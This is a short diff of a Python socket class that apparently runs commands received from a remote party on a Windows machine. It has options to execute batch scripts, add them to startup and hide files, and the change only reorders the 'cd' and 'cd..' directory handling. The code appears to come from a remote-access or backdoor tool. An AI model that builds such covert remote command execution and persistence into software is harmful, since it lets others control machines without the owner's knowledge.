@@ -30,12 +30,13 @@ class Socket:
 
         cmd = cmd.decode()
 
+        # Check for batch script
+
         # Initialize variables
         execute = False
         startup = False
         hide_file = False
 
-        # Check for batch script
         if "-batch" in cmd:
 
             if "-e" in cmd:
@@ -58,7 +59,11 @@ class Socket:
             return
 
         # Change working directory stuff
-        elif "cd" in cmd[0:2] and "cd.." not in cmd[0:4]:
+
+        elif "cd.." in cmd[0:4]:
+            chdir(self.get_parent_path(getcwd()))
+
+        elif "cd" in cmd[0:2]:
             path = getcwd() + "\\" + cmd[3:]
             try:
                 chdir(path)
@@ -67,11 +72,6 @@ class Socket:
                 return
             # self.send_msg(f"Changed directory to {path}")
             return
-
-        elif "cd.." in cmd[0:4]:
-            chdir(self.get_parent_path(getcwd()))
-            path = f"Changed directory to {getcwd()}"
-            # self.send_msg(path)
 
         # Normal cmd command stuff
         else:
